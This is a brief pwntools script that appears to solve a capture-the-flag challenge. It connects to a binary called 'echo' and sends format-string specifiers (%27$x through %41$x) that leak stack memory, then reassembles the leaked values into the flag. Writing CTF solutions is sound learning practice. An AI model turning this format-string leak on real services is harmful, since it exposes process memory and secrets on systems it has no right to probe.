#!/usr/bin/env python3
from pwn import *
from Crypto.Util.number import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './echo'
elf = context.binary = ELF(exe, checksec=True)
# libc = './lib/libc.so.6'
 #libc = ELF(libc, checksec=False)
context.log_level = 'debug'
host, port = 'chal.amt.rs', 1338

def initialize(argv=[]):
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

r = initialize()

r.recvuntil(b'>')

query1 = ''.join([f"%{i}$x" for i in range(27, 37)])
r.sendline(query1)

flag1 = r.recvuntil(b'\n').strip()

r.recvuntil(b'>')

query2 = ''.join([f"%{i}$x" for i in range(37, 42)])
r.sendline(query2)

flag2 = r.recvuntil(b'\n').strip()

encflag = (flag1 + flag2).decode() 
print(encflag)